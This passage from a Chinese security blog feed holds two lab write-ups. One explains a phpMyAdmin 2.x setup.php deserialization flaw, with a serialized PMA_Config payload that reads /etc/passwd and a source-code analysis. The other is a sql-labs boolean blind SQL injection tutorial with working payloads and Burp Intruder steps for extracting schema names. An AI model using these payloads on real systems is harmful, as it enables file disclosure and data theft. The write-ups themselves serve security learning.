title="参考"></a>参考</h5><p>[1]<a href="https://www.freebuf.com/vuls/170344.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/170344.html</a></p><p>[2]<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin反序列化</title>
      <link href="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h4 id="0x01-漏洞说明"><a href="#0x01-漏洞说明" class="headerlink" title="0x01 漏洞说明"></a>0x01 漏洞说明</h4><p>phpmyadmin 2.x版本的<code>setup.php</code>中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。</p><br><h4 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h4><p>通过<a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/WooYun-2016-199433/README.zh-cn.md" target="_blank" rel="noopener">vulhub</a>快速在docker中复现漏洞</p><p><img src="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p><br><h4 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h4><p>使用POST的方式请求<code>setup.php</code>,即可读取<code>passwd</code>文件</p><pre class=" language-php"><code class="language-php">action<span class="token operator">=</span>test<span class="token operator">&amp;</span>configuration<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"PMA_Config"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"source"</span><span class="token punctuation">,</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p><br><h4 id="0x04-源码分析"><a href="#0x04-源码分析" class="headerlink" title="0x04 源码分析"></a>0x04 源码分析</h4><p>网上找了许多教程都只说了漏洞如何利用，却没有分析成因，无奈只好自己粗略地分析下</p><br><p>首先分析<code>setup.php</code>，发现它会将POST请求的参数<code>configuration</code>进行反序列化</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'configuration'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$action</span> <span class="token operator">!=</span> <span class="token string">'clear'</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Grab previous configuration, if it should not be cleared</span>    <span class="token variable">$configuration</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'configuration'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Start with empty configuration</span>    <span class="token variable">$configuration</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>而payload中<code>configuration</code>的值是序列化后的<code>PMA_Config</code>类</p><pre class=" language-php"><code class="language-php">configuration<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"PMA_Config"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"source"</span><span class="token punctuation">,</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><br><p>所以我们应该从源码中找到<code>PMA_Config</code>类的定义，但是<code>setup</code>文件中并没有找到，所以一定包含了其他的php文件</p><p>果然，在开头处有行文件包含的代码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'./libraries/common.lib.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><br><p>顺藤摸瓜找到这个文件<code>common.lib.php</code>，结果依旧没有在找到<code>PMA_Config</code>类的定义</p><p>但我通过搜索class，发现了小惊喜，common.lib.php中还包含了其他的php文件，真是一层又一层</p><pre><code>require_once &#39;./libraries/sanitizing.lib.php&#39;;require_once &#39;./libraries/Theme.class.php&#39;;require_once &#39;./libraries/Theme_Manager.class.php&#39;;require_once &#39;./libraries/Config.class.php&#39;;</code></pre><br><p>终于，我在<code>Config.class.php</code>中找到了<code>PMA_Config</code>类的定义</p><p><img src="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><br><p>一般会出现php的反序列化，准是类中的魔术函数出现了问题</p><p>所以重点审查对象就是这几个函数</p><pre class=" language-php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>当一个对象创建时被调用<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当一个对象销毁时被调用<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当一个对象被当作一个字符串使用<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    在对象在被序列化之前运行<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   将在序列化之后立即被调用</code></pre><br><p>通过审计代码发现问题果然出现在<code>__construct</code>上</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$source</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// functions need to refresh in case of config file changed goes in</span>    <span class="token comment" spellcheck="true">// PMA_Config::load()</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// other settings, independant from config file, comes in</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkIsHttps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当一个类被创建，函数<code>__construct</code>马上就会被调用，函数中的<code>$this-&gt;load($source)</code>也会马上被执行</p><br><p>那我们再来看看函数<code>load()</code></p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token variable">$source</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadDefaults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token keyword">null</span> <span class="token operator">!==</span> <span class="token variable">$source</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setSource</span><span class="token punctuation">(</span><span class="token variable">$source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkConfigSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$cfg</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$old_error_reporting</span> <span class="token operator">=</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'file_get_contents'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$eval_result</span> <span class="token operator">=</span>        <span class="token function">eval</span><span class="token punctuation">(</span> <span class="token string">'?>'</span> <span class="token punctuation">.</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//重点在这</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$eval_result</span> <span class="token operator">=</span>    <span class="token function">eval</span><span class="token punctuation">(</span> <span class="token string">'?>'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$old_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$eval_result</span> <span class="token operator">===</span> <span class="token boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error_config_file</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span>  <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error_config_file</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source_mtime</span> <span class="token operator">=</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @<span class="token constant">TODO</span> check validity of <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'pma_collation_connection'</span><span class="token punctuation">]</span>    <span class="token operator">/</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'pma_collation_connection'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'collation_connection'</span><span class="token punctuation">,</span>        <span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'pma_collation_connection'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'collation_connection'</span><span class="token punctuation">,</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'DefaultConnectionCollation'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkCollationConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//$this->checkPmaAbsoluteUri();</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span> <span class="token operator">=</span> <span class="token function">PMA_array_merge_recursive</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span><span class="token punctuation">,</span> <span class="token variable">$cfg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们发现<code>load()</code>函数中，它调用了这一句<code>eval( &#39;?&gt;&#39; . file_get_contents($this-&gt;getSource()) );</code></p><p>函数<code>getSource()</code>就是返回类的<code>source</code>的值</p><p>而<code>file_get_contents</code>函数的作用就是将指定的文件转换成字符串</p><p>所以将source复制为某个文件的路径就能够实现任意文件读取了，比如<code>/etc/passwd</code></p><br><p>但是最后有个疑惑<code>eval( &#39;?&gt;&#39; . &quot;string&quot;);</code>这种形式确实能够输出字符串，我却不明白他的原理</p><p><img src="/2020/08/24/phpmyadmin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（四）SQL注入—布尔注入</title>
      <link href="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>有时候页面一个显示位都不给，这样就无法通过联合注入查询信息了，只能通过页面返回信息的真假条件判断是否存在注入，就像这样</li></ul><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(4).png" alt></p><ul><li>本篇用的靶场是<code>sql-labs</code>的第六关布尔注入</li><li>先看看数据库的结构</li></ul><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(17).png" alt></p><ul><li>表<code>emails</code>的数据</li></ul><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(12).png" alt></p><ul><li>遇到页面无显示位置的情况我们首先需要判断是否存在注入</li><li>先使用<code>1=1</code>，页面返回正常</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(5).png" alt></p><ul><li>接着使用<code>1=2</code>，页面返回失败，说明语句不成立，存在注入点</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(22).png" alt></p><ul><li>然后因为没有显示位，我们无法直接通过<code>database()</code>输出数据库名，需要先判断数据库名的位数</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">2</span><span class="token comment" spellcheck="true">--+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>这句话是判断数据库名的长度，如果成立将会返回正常页面，通过不断的增加数字，得到数据库名的位数</code></pre><p>&emsp;为了能够有效率，我们可以通过抓包爆破出数据库名的位数</p><p>&emsp;将抓到的请求包发送到<code>intruder</code>，然后选择需要爆破的位置，爆破模式选择为<code>Sniper</code>（狙击手模式），只爆破一个位置</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(6).png" alt></p><p>&emsp;然后<code>payload</code>选择为列表类型导入数字<code>0-9</code>，具体数字还可以再加，毕竟长度多长谁也说不准</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(10).png" alt></p><p>&emsp;爆破出结果后按照降序排序，可以看到当数字到达<code>9</code>的时候，页面出现了变化，说明数据库名的长度为<code>8</code></p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(23).png" alt></p><ul><li>得到数据库名的长度还不够，这只是为了能够效率地爆破出数据库名</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)='</span><span class="token number">a</span>'<span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)='</span><span class="token number">b</span>'<span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr(database(),1,1)='</span><span class="token number">c</span>'<span class="token comment" spellcheck="true">--+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>通过substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>，可以从字符串<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>中取数值，从第<span class="token number">1</span>个字符开始，每次只取一个字符通过不断变换参数，可以通过返回页面判断第几位是什么字符，比如上面的，如果数据库名第一个字符刚好是<span class="token number">a</span>，那么页面将会返回正确</code></pre><p>&emsp;同样的，我们可以通过Burp来爆破数据库名<br>&emsp;抓包发送到爆破模块，然后选择集束炸弹模式，因为这次爆破的参数是两个</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(15).png" alt></p><p>&emsp;然后选择<code>参数1</code>的payload类型为<code>0-9</code>的数字，<code>参数2</code>的payload类型为字符型<code>a-z</code>，当然有些数据库名会出现下划线等特殊字符，这些可以根据情况去加</p><p>&emsp;最后等待结果，因为是集束炸弹模式，所以时间会较长，完成后先选择<code>payload1</code>升序排序，然后再选择长度<code>length</code>升序排序</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(25).png" alt></p><p>&emsp;最后得出的数据库名为<code>security</code></p><ul><li>接着尝试出爆破数据库表名</li></ul><p>&emsp;前面尝试猜测出数据库名的时候，判断了库名的长度，所以我想先测试出表名的长度，以加快爆破的效率</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and length(select table_name from information_schema.tables where table_schema='</span>security' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>&emsp;<del>不过还是太天真，这条语句怎么样都不成立，好像length函数里就是没法嵌套select语句，那只能直接跑未知数字，时间长就长点吧</del>，后来我发现其实是行得通的，报错的原因是函数length()的关系，我们不能直接往里边甩查询语句呀，这样会导致length以为有好多个参数，所以正确的做法应该是在查询语句的两边再加一层括号，这么说来无论是表名还是字段，甚至是数据都是可以爆破出长度的（8月30日）</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and length((select table_name from information_schema.tables where table_schema='</span>security' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(19).png" alt="length函数里没加括号"></p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/1.png" alt="多了层括号后正确返回页面"></p><p>&emsp;构造爆破表名的payload</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema='</span>security<span class="token string">' limit 0,1),1,1)='</span><span class="token number">a</span>'<span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema='</span>security<span class="token string">' limit 0,1),1,1)='</span><span class="token number">b</span>'<span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select table_name from information_schema.tables where table_schema='</span>security<span class="token string">' limit 0,1),1,1)='</span><span class="token number">c</span>'<span class="token comment" spellcheck="true">--+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span> 用来指定第一个表名substr<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>  不断变换字符来猜测表名第一个字符</code></pre><p>&emsp;&emsp;通过不断变换<code>substr</code>的参数和对比的字符爆破出表名</p><p>&emsp;&emsp;同样的，抓包发送到爆破模块</p><p>&emsp;&emsp;因为同样有两个参数，所以我们选择集束炸弹模式</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(9).png" alt></p><p>&emsp;&emsp;第一个参数选择<code>1-20</code>，因为我们不知道表名有多长</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(20).png" alt></p><p>&emsp;&emsp;第二个参数选择字母<code>a-z</code>，也可以加些大写字母，因为有些表名首字母是大写的</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(11).png" alt></p><p>&emsp;&emsp;点击攻击按钮开始爆破，结果第一个表名为<code>emails</code></p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(1).png" alt></p><p>&emsp;&emsp;通过变换<code>limit</code>的参数，可以爆破第二张表名，表名为<code>referers</code></p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(8).png" alt></p><p>&emsp;&emsp;那么爆破出的表名因为不知道位数，会不会因为字典中缺少了某些字符没有爆破出来，该如何验证表名的完整性和正确性呢</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select table_name from information_schema.tables where table_schema='</span>security<span class="token string">' limit 0,1)='</span>emails'<span class="token comment" spellcheck="true">--+</span></code></pre><p>&emsp;&emsp;如果页面返回正确，即可证明表名是正确的</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(26).png" alt></p><ul><li>有了表名就可以测试出数据库字段名了</li></ul><p>&emsp;判断<code>colmun_name</code>其实原理都差不多，都是通过查询数据库里的information_schema`里的字段表去和字符串做匹配，通过返回的页面去辨别</p><p>&emsp;在已知数据库名和表名的情况下，可以用字段表去做字符匹配</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>emails<span class="token string">' limit 0,1),1,1)='</span><span class="token number">a</span>'<span class="token comment" spellcheck="true">--+</span></code></pre><p>&emsp;同样的操作，抓包爆破</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(3).png" alt></p><p>&emsp;设置类似的payload，爆破字段名，payload越多，爆破时间就越长</p><p>&emsp;爆破结果第一个字段名为<code>id</code><br><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(7).png" alt></p><p>&emsp;第二个字段名为<code>emailid</code>（在爆破第三个字段的时候，如果返回页面全都一样，说明不存在第三个字段了）</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(18).png" alt></p><p>&emsp;然后验证下字段名</p><p>&emsp;首先验证下<code>id</code>的,返回页面正确</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and (select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>emails<span class="token string">' limit 0,1)='</span>id'<span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(24).png" alt></p><p>&emsp;然后验证下第二个字段发现并未返回正确的页面，说明缺少了某个字符</p><pre class=" language-sql"><code class="language-sql">?id<span class="token 